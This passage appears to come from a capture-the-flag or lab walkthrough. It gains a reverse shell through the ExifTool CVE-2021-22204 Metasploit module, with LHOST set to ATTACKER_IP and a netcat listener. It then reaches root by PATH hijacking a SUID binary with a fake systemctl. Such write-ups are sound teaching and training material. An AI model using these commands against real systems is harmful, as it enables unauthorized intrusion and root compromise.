## 💥 Exploitation (ExifTool RCE – CVE-2021-22204)

### Vulnerability Research
- ExifTool version 12.23 is vulnerable to a **Remote Code Execution** flaw.
- CVE number: **CVE-2021-22204**
- The vulnerability arises from improper input sanitisation leading to Perl code injection.

### Metasploit Module
- Used Metasploit to generate a malicious image payload:
  ```bash
  msfconsole
  search exiftool
  use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
  set LHOST ATTACKER_IP
  set LPORT 4444
  set FILENAME payload.jpg
  exploit
  ```
- Generated a `payload.jpg` file.

### Upload and Trigger
- Started a Netcat listener:
  ```bash
  nc -lvnp 4444
  ```
- Uploaded the malicious image via the `/upload/` page.
- Clicked on the uploaded image to view its details – this triggered the reverse shell.

## 🔑 Privilege Escalation – PATH Hijacking

### Enumeration
- Listed files in the current directory:
  ```bash
  ls -lah
  ```
- Found a SUID binary: `serverManager` (owned by root, SUID bit set).
- Also found its source code (`serverManager.c`), revealing that it calls `system("systemctl status --no-pager dogpics")` without a full path.

### Understanding the Vulnerability
- The binary runs as root due to SUID.
- It uses `system()` with an incomplete path (`systemctl` instead of `/usr/bin/systemctl`).
- The shell will search the `PATH` for `systemctl` and run the first match.
- By creating a fake `systemctl` in a writable directory and prepending that directory to `PATH`, we can hijack execution.

### Exploitation Steps
1. Create a fake `systemctl` that spawns a shell:
   ```bash
   echo '/bin/bash' > systemctl
   chmod +x systemctl
   ```
2. Modify `PATH` to prioritise the current directory:
   ```bash
   export PATH=.:$PATH
   ```
3. Verify that `which systemctl` points to our fake binary.
4. Run the vulnerable binary:
   ```bash
   ./serverManager
   ```
   Select option `0` (or any) – our fake `systemctl` executes, giving a root shell.

## 🔑 Key Takeaways
- **Always enumerate web applications thoroughly** – developer comments, hidden directories, and API endpoints can reveal valuable information.
- **Version disclosure is dangerous** – exposing software versions can lead to known exploits (CVE-2021-22204).
- **Burp Suite's site map** is great for mapping API routes automatically.
- **ExifTool RCE** is a real‑world vulnerability – understand how it works (Perl injection via DjVu ANT files).
- **PATH hijacking** is a classic privilege escalation vector – when a SUID binary calls a command without a full path, you can override it.
- **Always check the source code** (if available) for clues on how the binary works.
